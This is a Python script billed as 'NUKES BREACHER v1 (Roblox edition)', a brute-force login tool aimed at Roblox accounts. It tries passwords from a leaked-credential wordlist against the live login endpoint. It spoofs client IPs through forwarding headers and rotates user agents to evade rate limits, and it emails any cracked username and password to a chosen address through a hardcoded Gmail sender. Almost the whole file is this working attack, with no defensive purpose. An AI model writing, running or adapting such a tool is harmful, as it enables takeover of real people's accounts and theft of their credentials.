import requests
import time
import random
from datetime import datetime
from tqdm import tqdm
from colorama import Fore, Style, init
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import sys
import os

init(autoreset=True)

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0'
]

ip_addresses = [
    '127.0.0.1', '192.168.1.1', '10.0.0.1', '172.16.0.1', '8.8.8.8', '8.8.4.4', '1.1.1.1', '9.9.9.9', '104.16.54.23', '178.32.56.72'
]

rainbow_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]

ascii_art = """
   _   _   _    _   _  __  ______    _____     ____    _____    ______               _____   _    _   ______   _____              __ 
  | \ | | | |  | | | |/ / |  ____|  / ____|   |  _ \  |  __ \  |  ____|     /\      / ____| | |  | | |  ____| |  __ \            /_ |
  |  \| | | |  | | | ' /  | |__    | (___     | |_) | | |__) | | |__       /  \    | |      | |__| | | |__    | |__) |   __   __  | |
  | . ` | | |  | | |  <   |  __|    \___ \    |  _ <  |  _  /  |  __|     / /\ \   | |      |  __  | |  __|   |  _  /    \ \ / /  | |
  | |\  | | |__| | | . \  | |____   ____) |   | |_) | | | \ \  | |____   / ____ \  | |____  | |  | | | |____  | | \ \     \ V /   | |
  |_| \_|  \____/  |_|\_\ |______| |_____/    |____/  |_|  \_\ |______| /_/    \_\  \_____| |_|  |_| |______| |_|  \_\     \_/    |_|
                                                                                                                                    
                                                                                                                                    
   __  _____            _       _                               _   _   _     _                  __                                 
  / / |  __ \          | |     | |                             | | (_) | |   (_)                 \ \                                
 | |  | |__) |   ___   | |__   | |   ___   __  __     ___    __| |  _  | |_  _    ___    _ __    | |                               
 | |  |  _  /   / _ \  | '_ \  | |  / _ \  \ \/ /    / _ \  / _` | | | | __| | |  / _ \  | '_ \   | |                               
 | |  | | \ \  | (_) | | |_) | | | | (_) |  >  <    |  __/ | (_| | | | | |_  | | | (_) | | | | |  | |                               
 | |  |_|  \_\  \___/  |_.__/  |_|  \___/  /_/\_\    \___|  \__,_| |_|  \__| |_|  \___/  |_| |_|  | |                               
  \_\                                                                                            /_/                                
                                                                                                                                    
                                                                                                                                    
Made by iNukedyou on Discord!
Version 1: v1
Enjoy >;)
"""

def print_loading_screen():
    print(Fore.GREEN + "Initializing script...")
    for _ in tqdm(range(100), desc="Loading...", ncols=100, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}"):
        time.sleep(0.04)

def send_email(success, username, password, receiver_email):
    sender_email = 'nbreacherbot@gmail.com'
    subject = "Brute Force Notification"
    body = f"Success: {success}\nUsername: {username}\nPassword: {password}"
    
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, os.getenv('EMAIL_PASSWORD'))
            text = msg.as_string()
            server.sendmail(sender_email, receiver_email, text)
        print(f"\n[INFO] Email sent to {receiver_email}")
    except Exception as e:
        print(f"[ERROR] Failed to send email: {e}")

def read_passwords(file_path):
    try:
        with open(file_path, 'r') as file:
            passwords = file.readlines()
        passwords = [pwd.strip() for pwd in passwords if pwd.strip() and not pwd.startswith('#')]
        return passwords
    except Exception as e:
        print(f"[ERROR] Failed to read password file {file_path}: {e}")
        return []

def attempt_login(username, password, user_agent, ip_address, token=None, cookie=None):
    url = 'https://www.roblox.com/newlogin'
    
    headers = {
        'User-Agent': user_agent,
        'X-Forwarded-For': ip_address,
        'X-Originating-IP': ip_address,
        'X-Remote-IP': ip_address,
        'X-Remote-Addr': ip_address,
        'X-Client-IP': ip_address,
    }
    if token:
        headers['Authorization'] = f'Bearer {token}'
    if cookie:
        headers['Cookie'] = cookie

    data = {
        'Username/Email/Phone': username, 
        'password': password,
    }

    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        
        if response.status_code == 200:
            return response
        else:
            print(f"[ERROR] Login failed with status code: {response.status_code}")
            return None
    except requests.RequestException as e:
        print(f"[ERROR] Request failed: {e}")
        return None

def log_attempt(username, password, success, retries=0):
    with open('login_attempts.log', 'a') as log_file:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_file.write(f"{timestamp} - Username: {username}, Password: {password}, Success: {success}, Retries: {retries}\n")

def track_passwords_per_minute(start_time, total_attempts):
    elapsed_time = time.time() - start_time
    passwords_per_minute = total_attempts / (elapsed_time / 60)
    print(f"\n[INFO] {total_attempts} attempts made ({passwords_per_minute:.2f} passwords/min)\n")

def estimate_time_left(total_attempts, passwords, start_time):
    if total_attempts == 0:
        print("No attempts made yet. Estimating time left is not possible.")
        return

    attempts_left = len(passwords) - total_attempts
    elapsed_time = time.time() - start_time

    if attempts_left <= 0:
        print("All attempts completed!")
        return

    estimated_time = (elapsed_time / total_attempts) * attempts_left
    print(f"Estimated time left: {estimated_time / 60:.2f} minutes")

def print_box(title, content, stats=None, response_code=None, response_header=None):
    sys.stdout.write(f"\033[F\033[K{Fore.CYAN}==========================================\n")
    sys.stdout.write(f"{Fore.GREEN}{title}\n")
    sys.stdout.write(f"{Fore.WHITE}{content}\n")
    if stats:
        sys.stdout.write(f"{Fore.YELLOW}{stats}\n")
    if response_code:
        sys.stdout.write(f"{Fore.MAGENTA}Status Code: {response_code}\n")
    if response_header:
        sys.stdout.write(f"{Fore.YELLOW}Response Header: {response_header}\n")
    sys.stdout.write(f"{Fore.CYAN}==========================================\n")

def main():
    print(Fore.CYAN + ascii_art)
    print_loading_screen()

    username = input("Enter username or email/phone number: ")
    receiver_email = input("Enter email to receive notifications: ")

    passwords = read_passwords('fortinet-2021_passwords.txt')
    total_attempts = 0
    start_time = time.time()

    for password in passwords:
        user_agent = random.choice(user_agents)
        ip_address = random.choice(ip_addresses)
        
        print_box(f"Attempting {username} with {password}", "", f"Attempt #{total_attempts + 1}")

        response = attempt_login(username, password, user_agent, ip_address)

        if response and response.status_code == 200:
            print_box("Success!", f"Guessed password: {password}", "Login Successful", response.status_code, response.headers)
            send_email(True, username, password, receiver_email)
            log_attempt(username, password, success=True)
            break
        else:
            print_box("Failed", f"Guessed password: {password}", "Login Failed", response.status_code, response.headers)
            log_attempt(username, password, success=False)
        
        total_attempts += 1
        track_passwords_per_minute(start_time, total_attempts)
        estimate_time_left(total_attempts, passwords, start_time)

if __name__ == "__main__":
    main()
